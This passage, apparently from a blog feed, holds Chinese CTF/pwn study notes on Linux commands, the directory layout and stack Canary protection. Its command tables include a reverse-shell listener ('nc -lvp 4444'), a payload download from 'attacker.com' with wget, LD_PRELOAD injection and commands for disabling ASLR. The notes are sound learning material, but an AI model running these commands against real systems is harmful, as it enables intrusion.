      <url>/2025/07/bf16778323fb.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 1-从源代码到可执行文件 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/877c6e4ae0f9.html"/>
      <url>/2025/07/877c6e4ae0f9.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 2-汇编基础 </category>
          
          <category> CPU架构与指令集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2025/07/a9d7565b1f06.html"/>
      <url>/2025/07/a9d7565b1f06.html</url>
      
        <content type="html"><![CDATA[<h1 id="终端命令格式"><a href="#终端命令格式" class="headerlink" title="终端命令格式"></a>终端命令格式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>·command ：命令名，相应功能的英文单词或单词的缩写<br>·[-options] ：选项，可用来对命令进行控制，也可以省略<br>·parameter ：传给命令的参数，可以是 零个、一个 或者 多个</p><h2 id="目录操作命令-cd、pwd、ls、mkdir、rmdir、du"><a href="#目录操作命令-cd、pwd、ls、mkdir、rmdir、du" class="headerlink" title="目录操作命令 cd、pwd、ls、mkdir、rmdir、du"></a>目录操作命令 cd、pwd、ls、mkdir、rmdir、du</h2><table><thead><tr><th>命令 &#x2F; 选项组合</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>基础命令</strong></td><td></td></tr><tr><td><code>cd</code></td><td>切换到另一个目录</td></tr><tr><td><code>pwd</code></td><td>打印当前所在目录（print working directory ）</td></tr><tr><td><code>ls</code></td><td>列出目录内容</td></tr><tr><td><strong><code>ls</code> 常用选项</strong></td><td></td></tr><tr><td><code>ls -l</code></td><td>长格式输出文件，一个文件显示一行（简写 <code>ll</code> ）</td></tr><tr><td><code>ls -a</code></td><td>显示以 <code>.</code> 开头的隐藏文件（默认不显示隐藏文件 ）</td></tr><tr><td><code>ls -d</code></td><td>显示目录本身，而非目录下的文件（默认目录会展开显示内容 ）</td></tr><tr><td><code>ls -lh</code></td><td>长格式输出 + 字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><code>ls -t</code></td><td>按<strong>修改时间从晚到早</strong>排序文件（最近修改的先显示 ）</td></tr><tr><td><code>ls -tr</code></td><td>按<strong>修改时间从早到晚</strong>排序文件（最近修改的后显示 ）</td></tr><tr><td><code>ls -R</code></td><td>递归列出当前目录及所有子目录的文件（遍历嵌套目录 ）</td></tr><tr><td><strong>个人常用 <code>ls</code> 用法</strong></td><td><code>ll -ah</code> （长格式 + 显示隐藏文件 + 人性化字节数 ）</td></tr><tr><td><strong><code>mkdir</code></strong></td><td>创建目录；<code>-p</code> 选项可级联创建多层目录（如 <code>mkdir -p a/b/c</code> ）</td></tr><tr><td><strong><code>rmdir</code></strong></td><td>删除空目录；非空目录需用 <code>rm -rf 目录名</code> 强制删除（谨慎使用 <code>rm -rf</code> ）</td></tr><tr><td><strong><code>du</code> 命令及选项</strong></td><td></td></tr><tr><td><code>du</code></td><td>统计目录 &#x2F; 文件的磁盘占用字节数</td></tr><tr><td><code>du -s</code></td><td>只显示总字节数（不展开子文件 &#x2F; 目录 ）</td></tr><tr><td><code>du -h</code></td><td>字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><strong>个人常用 <code>du</code> 用法</strong></td><td><code>du -sh</code> （统计总占用 + 人性化字节数 ）</td></tr></tbody></table><h2 id="文件操作命令-which、touch、cp、mv、rm、file"><a href="#文件操作命令-which、touch、cp、mv、rm、file" class="headerlink" title="文件操作命令 which、touch、cp、mv、rm、file"></a>文件操作命令 which、touch、cp、mv、rm、file</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>功能说明</strong></th><th><strong>语法示例</strong></th><th><strong>关键参数 &#x2F; 补充</strong></th></tr></thead><tbody><tr><td><code>which</code></td><td>查找命令在系统中的绝对路径</td><td><code>which cd</code> <code>which ls</code> <code>which date</code></td><td>- 仅查系统 <code>PATH</code> 路径内的可执行命令</td></tr><tr><td><code>touch</code></td><td>创建空文件 &#x2F; 更新文件修改时间</td><td><code>touch /root/aaa /root/bbb /root/ccc</code></td><td>- 无文件则创建，有文件则改<strong>修改时间</strong></td></tr><tr><td><code>cp</code></td><td>复制文件 &#x2F; 目录</td><td>复制文件： <code>cp /root/install.log /tmp</code> <code>cp /root/install.log /tmp/abc.log</code> 复制目录： <code>cp -R /root /tmp</code> <code>cp -R /root /tmp/abc</code></td><td><code>-R</code>：递归复制目录（必加） <code>-i</code>：覆盖前提示（默认隐藏，需手动开）</td></tr><tr><td><code>mv</code></td><td>移动文件 &#x2F; 目录 &#x2F; 重命名</td><td>移动： <code>mv /root/install.log.bak /tmp</code> 重命名： <code>mv /tmp/root /tmp/root1</code></td><td>- 移动 + 重命名可一步完成（如 <code>mv 旧路径 新路径</code> ）</td></tr><tr><td><code>rm</code></td><td>删除文件 &#x2F; 目录（<strong>危险操作</strong>）</td><td>删除文件： <code>rm /root/install.log.bak</code> 删除目录： <code>rm -rf /tmp/root1</code></td><td><code>-r</code>：递归删目录内容 <code>-f</code>：强制删除（无提示） <code>-i</code>：删除前逐一确认（建议日常用）</td></tr><tr><td><code>file</code></td><td>查看文件的类型（格式 &#x2F; 编码等）</td><td><code>file 文件名</code> 例：<code>file /root/install.log</code></td><td>- 可识别文本、二进制、压缩包等类型</td></tr></tbody></table><h2 id="查看登录用户命名-who、w"><a href="#查看登录用户命名-who、w" class="headerlink" title="查看登录用户命名 who、w"></a>查看登录用户命名 who、w</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>who</strong></td><td><strong>当前用户登录的信息</strong></td></tr><tr><td><strong>w</strong></td><td><strong>当前用户登录的信息，以什么程序登录的</strong></td></tr></tbody></table><h2 id="文件内容查看命令-cat、tac、more、less、tail、head"><a href="#文件内容查看命令-cat、tac、more、less、tail、head" class="headerlink" title="文件内容查看命令 cat、tac、more、less、tail、head"></a>文件内容查看命令 cat、tac、more、less、tail、head</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>cat</td><td>查看文本文件内容，将文本文件内容全部打印到标准输出 选项 -n 输出结果带行号</td></tr><tr><td>tac</td><td>查看文本文件内容，倒序输出 按照行号倒序打印文本文件的内容</td></tr><tr><td>more</td><td>分页显示文件内容，例如：more &#x2F;root&#x2F;install.log 默认显示进度百分比 空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>less</td><td>分页显示文件内容，例如：less &#x2F;root&#x2F;install.log 选项 -m 显示进度百分比 可以用“&#x2F;”后跟关键字搜索文件内容 空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>tail</td><td>查看文件尾部10行，例如：tail &#x2F;root&#x2F;install.log 选项-N （N为正整数）可以指定显示末尾N行内容</td></tr><tr><td>head</td><td>查看文件头部10行，例如：head &#x2F;root&#x2F;install.log 选项-N （N为正整数）可以指定显示头部N行内容</td></tr></tbody></table><h2 id="系统管理类命令-shutdown、reboot、lscpu"><a href="#系统管理类命令-shutdown、reboot、lscpu" class="headerlink" title="系统管理类命令 shutdown、reboot、lscpu"></a>系统管理类命令 shutdown、reboot、lscpu</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>shutdown</strong></td><td><strong>关机命令</strong> <strong>shutdown -h now 立刻关机</strong> <strong>shutdown -h +10 “10分钟后关机”，每个登录用户收到“10分钟后关机”的消息，并于10分钟后关机</strong> <strong>shutdown -c 取消关机</strong></td></tr><tr><td><strong>reboot</strong></td><td><strong>重启系统</strong></td></tr><tr><td><strong>lscpu</strong></td><td><strong>查看系统cpu信息</strong></td></tr></tbody></table><h1 id="查阅命令帮助信息"><a href="#查阅命令帮助信息" class="headerlink" title="查阅命令帮助信息"></a>查阅命令帮助信息</h1><h2 id="help"><a href="#help" class="headerlink" title="-help"></a>-help</h2><p>说明：显示 command 命令的帮助信息</p><h2 id="man"><a href="#man" class="headerlink" title="-man"></a>-man</h2><p>说明：</p><p>·查阅 command 命令的使用手册（man 是 manual 的缩写，是 Linux 提供的一个 手册，包含了绝大部分的命令、函数的详细使用）<br>·说明：使用 man 时的操作键</p><table><thead><tr><th>操作键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示手册页的下一屏</td></tr><tr><td>Enter 键</td><td>一次滚动手册页的一行</td></tr><tr><td>b</td><td>回滚一屏</td></tr><tr><td>f</td><td>前滚一屏</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>&#x2F;word</td><td>搜索 word 字符串</td></tr></tbody></table><h1 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全:"></a>自动补全:</h1><p>在敲出 文件 ／ 目录 ／ 命令 的前几个字母之后，按下 tab 键</p><p>如果输入的没有歧义，系统会自动补全<br>如果还存在其他 文件 ／ 目录 ／ 命令 ，再按一下 tab 键，系统会提示可能存在的命令<br>小技巧</p><p><strong><code>小技巧：</code></strong></p><p>ctrl + shift + &#x3D; 放大终端窗口的字体显示<br>ctrl + - 缩小终端窗口的字体显示</p><p>按 上 ／ 下 光标键可以在曾经使用过的命令之间来回切换<br>如果想要退出选择，并且不想执行当前选中的命令，可以按 ctrl + c</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="文件分析命令（关键！）"><a href="#文件分析命令（关键！）" class="headerlink" title="文件分析命令（关键！）"></a>文件分析命令（关键！）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>file</code></strong></td><td>查看文件类型</td><td><code>file ./vuln</code></td><td>识别ELF类型（32&#x2F;64位）、动态&#x2F;静态链接</td></tr><tr><td><strong><code>checksec</code></strong></td><td>检查安全机制</td><td><code>checksec --file=./vuln</code></td><td>查看NX, PIE, Canary, RELRO等防护状态</td></tr><tr><td><strong><code>readelf</code></strong></td><td>ELF文件分析</td><td><code>readelf -a ./vuln</code></td><td>查看节头、符号表、重定位表、程序头</td></tr><tr><td><code>readelf -S</code></td><td>查看节头信息</td><td><code>readelf -S ./vuln</code></td><td>定位.text&#x2F;.plt&#x2F;.got等关键段地址</td></tr><tr><td><code>readelf -s</code></td><td>查看符号表</td><td>&#96;readelf -s .&#x2F;vuln</td><td>grep system&#96;</td></tr><tr><td><strong><code>objdump</code></strong></td><td>反汇编分析</td><td><code>objdump -d ./vuln</code></td><td>反汇编代码段</td></tr><tr><td><code>objdump -M</code></td><td>指定反汇编格式</td><td><code>objdump -M intel -d ./vuln</code></td><td>Intel格式反汇编（更易读）</td></tr><tr><td><code>objdump -j</code></td><td>反汇编特定段</td><td><code>objdump -j .plt -d ./vuln</code></td><td>分析PLT表</td></tr><tr><td><strong><code>strings</code></strong></td><td>提取字符串</td><td>&#96;strings .&#x2F;vuln</td><td>grep “&#x2F;bin&#x2F;sh”&#96;</td></tr><tr><td><strong><code>ldd</code></strong></td><td>查看动态依赖</td><td><code>ldd ./vuln</code></td><td>获取libc路径和基址偏移</td></tr></tbody></table><h2 id="调试分析命令（核心工具）"><a href="#调试分析命令（核心工具）" class="headerlink" title="调试分析命令（核心工具）"></a>调试分析命令（核心工具）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>gdb</code></strong></td><td>GNU调试器</td><td><code>gdb ./vuln</code></td><td>动态调试分析</td></tr><tr><td><code>gdb -p</code></td><td>附加进程</td><td><code>gdb -p &lt;pid&gt;</code></td><td>调试运行中的程序</td></tr><tr><td><code>gdb -ex</code></td><td>执行命令</td><td><code>gdb -ex &quot;b main&quot; -ex &quot;r&quot; ./vuln</code></td><td>自动化调试任务</td></tr><tr><td><strong><code>strace</code></strong></td><td>系统调用跟踪</td><td><code>strace ./vuln</code></td><td>监控系统调用（如execve）</td></tr><tr><td><strong><code>ltrace</code></strong></td><td>库函数跟踪</td><td><code>ltrace ./vuln</code></td><td>监控库函数调用（如malloc）</td></tr><tr><td><strong><code>pwndbg</code></strong></td><td>增强版GDB</td><td>-</td><td>专为Pwn设计的GDB插件</td></tr><tr><td><code>info proc</code></td><td>查看进程信息</td><td><code>info proc mappings</code></td><td>查看内存映射布局</td></tr></tbody></table><h2 id="网络操作命令（漏洞利用必备）"><a href="#网络操作命令（漏洞利用必备）" class="headerlink" title="网络操作命令（漏洞利用必备）"></a>网络操作命令（漏洞利用必备）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>nc</code></strong></td><td>网络工具</td><td><code>nc -lvp 4444</code></td><td>监听端口（接收反弹shell）</td></tr><tr><td></td><td></td><td><code>nc 192.168.1.100 1337</code></td><td>连接远程漏洞服务</td></tr><tr><td><strong><code>socat</code></strong></td><td>高级网络工具</td><td><code>socat TCP-LISTEN:4444,reuseaddr,fork EXEC:./vuln</code></td><td>稳定连接（用于ROP链开发）</td></tr><tr><td><strong><code>curl</code></strong></td><td>HTTP客户端</td><td><code>curl http://target:8080/exploit</code></td><td>Web Pwn题利用</td></tr><tr><td><strong><code>wget</code></strong></td><td>文件下载</td><td><code>wget http://attacker.com/shellcode.bin</code></td><td>下载远程payload</td></tr></tbody></table><h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>ps</code></strong></td><td>查看进程</td><td>&#96;ps aux</td><td>grep vuln&#96;</td></tr><tr><td><strong><code>kill</code></strong></td><td>终止进程</td><td><code>kill -9 &lt;pid&gt;</code></td><td>强制结束崩溃的程序</td></tr><tr><td><strong><code>pkill</code></strong></td><td>按名杀进程</td><td><code>pkill -f vuln</code></td><td>快速结束目标程序</td></tr><tr><td><strong><code>top</code></strong></td><td>实时进程监控</td><td><code>top</code></td><td>监控资源占用情况</td></tr><tr><td><strong><code>nohup</code></strong></td><td>后台运行</td><td><code>nohup ./vuln &amp;</code></td><td>保持服务运行</td></tr></tbody></table><h2 id="环境配置命令"><a href="#环境配置命令" class="headerlink" title="环境配置命令"></a>环境配置命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>export</code></strong></td><td>环境变量</td><td><code>export LD_PRELOAD=./libc.so.6</code></td><td>预加载库（库注入攻击）</td></tr><tr><td></td><td></td><td><code>export PYTHONPATH=/path/to/pwntools</code></td><td>设置Python路径</td></tr><tr><td><strong><code>ulimit</code></strong></td><td>资源限制</td><td><code>ulimit -c unlimited</code></td><td>启用core dump</td></tr><tr><td><strong><code>setarch</code></strong></td><td>设置架构</td><td><code>setarch </code>uname -m<code> -R ./vuln</code></td><td>禁用ASLR（地址随机化）</td></tr><tr><td><strong><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></strong></td><td>全局禁用ASLR</td><td>需要root权限</td><td>调试环境配置</td></tr></tbody></table><h2 id="二进制处理命令"><a href="#二进制处理命令" class="headerlink" title="二进制处理命令"></a>二进制处理命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>xxd</code></strong></td><td>十六进制查看</td><td>&#96;xxd .&#x2F;vuln</td><td>head&#96;</td></tr><tr><td><strong><code>hexedit</code></strong></td><td>十六进制编辑</td><td><code>hexedit ./vuln</code></td><td>手动修改二进制文件</td></tr><tr><td><strong><code>patchelf</code></strong></td><td>ELF修补</td><td><code>patchelf --set-interpreter /lib/ld-linux.so.2 ./vuln</code></td><td>修改动态链接器</td></tr><tr><td></td><td></td><td><code>patchelf --replace-needed libc.so.6 ./libc_target.so ./vuln</code></td><td>替换依赖库</td></tr><tr><td><strong><code>objcopy</code></strong></td><td>目标文件操作</td><td><code>objcopy --dump-section .text=text.bin ./vuln</code></td><td>提取代码段</td></tr></tbody></table><h2 id="开发辅助命令"><a href="#开发辅助命令" class="headerlink" title="开发辅助命令"></a>开发辅助命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>python</code></strong></td><td>Python解释器</td><td><code>python3 exploit.py</code></td><td>运行漏洞利用脚本</td></tr><tr><td><strong><code>pip</code></strong></td><td>Python包管理</td><td><code>pip install pwntools</code></td><td>安装Pwn工具库</td></tr><tr><td><strong><code>gcc</code></strong></td><td>编译器</td><td><code>gcc -fno-stack-protector -z execstack vuln.c -o vuln</code></td><td>编译含漏洞程序</td></tr><tr><td><strong><code>make</code></strong></td><td>构建工具</td><td><code>make</code></td><td>编译CTF题目</td></tr><tr><td><strong><code>tmux</code></strong></td><td>终端复用器</td><td><code>tmux new -s pwn</code></td><td>管理多个调试窗口</td></tr></tbody></table><h2 id="信息搜索命令"><a href="#信息搜索命令" class="headerlink" title="信息搜索命令"></a>信息搜索命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>grep</code></strong></td><td>文本搜索</td><td>&#96;objdump -d .&#x2F;vuln</td><td>grep “call”&#96;</td></tr><tr><td><strong><code>find</code></strong></td><td>文件查找</td><td><code>find / -name &quot;libc.so.6&quot; 2&gt;/dev/null</code></td><td>查找libc库</td></tr><tr><td><strong><code>which</code></strong></td><td>命令定位</td><td><code>which gdb</code></td><td>查找工具路径</td></tr><tr><td><strong><code>man</code></strong></td><td>手册查看</td><td><code>man 2 execve</code></td><td>查看系统调用文档</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-Linux安全机制 </category>
          
          <category> 1-Linux基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux目录结构</title>
      <link href="/2025/07/687b40b96b60.html"/>
      <url>/2025/07/687b40b96b60.html</url>
      
        <content type="html"><![CDATA[<h1 id="根目录的子目录"><a href="#根目录的子目录" class="headerlink" title="根目录的子目录"></a>根目录的子目录</h1><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>bin是Binary的缩写, 这个目录存放着最经常使用的命令，由系统、系统管理员和用户共享</td></tr><tr><td>&#x2F;boot</td><td>这里存放的是启动Linux时使用的一些核心文件，包括一些链接文件以及镜像文件</td></tr><tr><td>&#x2F;dev</td><td>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的</td></tr><tr><td>&#x2F;etc</td><td>大多数重要的系统配置文件都在&#x2F;etc目录下，该目录包含的数据类似于Windows控制面板中的数据</td></tr><tr><td>&#x2F;home</td><td>普通用户的家目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的</td></tr><tr><td>&#x2F;lib</td><td>库文件，包括系统和用户所需要的各种程序的文件</td></tr><tr><td>&#x2F;lost+found</td><td>每个分区在其上目录中都有一个lost+found。故障期间保存的文件在这里</td></tr><tr><td>&#x2F;media</td><td>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下</td></tr><tr><td>&#x2F;mnt</td><td>外部文件系统的标准挂载点，例如CD-ROM(光驱)或数码相机</td></tr><tr><td>&#x2F;opt</td><td>通常包含额外的和第三方软件。这是给主机额外安装的大型应用程序所放置的目录</td></tr><tr><td>&#x2F;proc</td><td>包含有关系统资源信息的虚拟文件系统。这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件&lt;</td></tr><tr><td>&#x2F;root</td><td>该目录为系统管理员，也称作超级权限者的用户家目录。注意根目录 &#x2F; 和根用户的主目录 &#x2F;root 之间的区别</td></tr><tr><td>&#x2F;sbin</td><td>s就是Super User的意思，这里存放的是系统管理员root使用的系统管理程序</td></tr><tr><td>&#x2F;tmp</td><td>系统使用的临时空间，在重新启动时清理，所以不要使用它来保存任何工作!该目录对于所有用户都可以访问，不要把重要文件放置于该目录</td></tr><tr><td>&#x2F;usr</td><td>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似与windows下的program files目录</td></tr><tr><td>&#x2F;var</td><td>用户创建的所有可变文件和临时文件的存储空间，如日志文件(一般是&#x2F;var&#x2F;log)、邮件队列、打印假脱机程序区、从Internet下载的文件的临时存储空间，或在刻录CD之前保存它的映像。</td></tr></tbody></table><h1 id="Linux绝对路径和相对路径"><a href="#Linux绝对路径和相对路径" class="headerlink" title="Linux绝对路径和相对路径"></a>Linux绝对路径和相对路径</h1><h2 id="绝对路径："><a href="#绝对路径：" class="headerlink" title="绝对路径："></a>绝对路径：</h2><p>以根目录“&#x2F;”开始的路径，表示从Linux目录结构的最顶点算起，特点是路径以“&#x2F;”开头</p><h2 id="相对路径："><a href="#相对路径：" class="headerlink" title="相对路径："></a>相对路径：</h2><p>不以根目录“&#x2F;”开始的路径，以当前目录作为起始点，特点是不以“&#x2F;”开头</p><p>每个目录下都有”.”和”..”2个目录：</p><p>一个点“ . ”代表当前目录，写全了“ .&#x2F; ”</p><p>二个点“ .. ”代表上一级目录，写全了“ ..&#x2F; ”</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-Linux安全机制 </category>
          
          <category> 1-Linux基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Canary</title>
      <link href="/2025/07/0d840bbdb054.html"/>
      <url>/2025/07/0d840bbdb054.html</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护的目的。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="简单程序"><a href="#简单程序" class="headerlink" title="简单程序"></a>简单程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    char buf[10];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br><span class="line"># 无栈保护</span><br><span class="line">$ gcc -fno-stack-protector canary.c -o fno.out #gcc -fno-stack-protector -o no_canary canary.c</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./fno.out</span><br><span class="line">$ Segmentation fault (core dumped)</span><br><span class="line"># 基础/最强栈保护</span><br><span class="line">$ gcc -fstack-protector -o with_canary canary.c(gcc -fstack-protector-strong -o strong_canary canary.c) #gcc -fstack-protector canary.c -o f.out</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./f.out</span><br><span class="line">$ *** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">plaintext</span><br><span class="line"></span><br><span class="line"># 编译带canary保护的版本</span><br><span class="line">gcc -fstack-protector -o with_canary canary.c</span><br><span class="line"></span><br><span class="line"># 检查文件是否生成</span><br><span class="line">ls -l with_canary</span><br><span class="line">-rwxr-xr-x 1 ubuntu ubuntu 16024 Jun 30 16:13 with_canary</span><br><span class="line"></span><br><span class="line">gdb -q ./with_canary -ex &quot;disassemble main&quot; -ex &quot;q&quot;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   `0x0000000000001175 &lt;+12&gt;:mov    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x000000000000117e &lt;+21&gt;:mov    QWORD PTR [rbp-0x8],rax`</span><br><span class="line">   0x0000000000001182 &lt;+25&gt;:xor    eax,eax</span><br><span class="line">   0x0000000000001184 &lt;+27&gt;:lea    rax,[rbp-0x12]</span><br><span class="line">   0x0000000000001188 &lt;+31&gt;:mov    rsi,rax</span><br><span class="line">   0x000000000000118b &lt;+34&gt;:lea    rax,[rip+0xe72]        # 0x2004</span><br><span class="line">   0x0000000000001192 &lt;+41&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000000119a &lt;+49&gt;:call   0x1070 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:nop</span><br><span class="line">   `0x00000000000011a0 &lt;+55&gt;:mov    rax,QWORD PTR [rbp-0x8]`</span><br><span class="line">   `0x00000000000011a4 &lt;+59&gt;:sub    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x00000000000011ad &lt;+68&gt;:je     0x11b4 &lt;main+75&gt;`</span><br><span class="line">   `0x00000000000011af &lt;+70&gt;:call   0x1060 &lt;__stack_chk_fail@plt&gt;`</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:leave</span><br><span class="line">   0x00000000000011b5 &lt;+76&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h2><p>开启 Canary 保护的 stack 结构大概如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 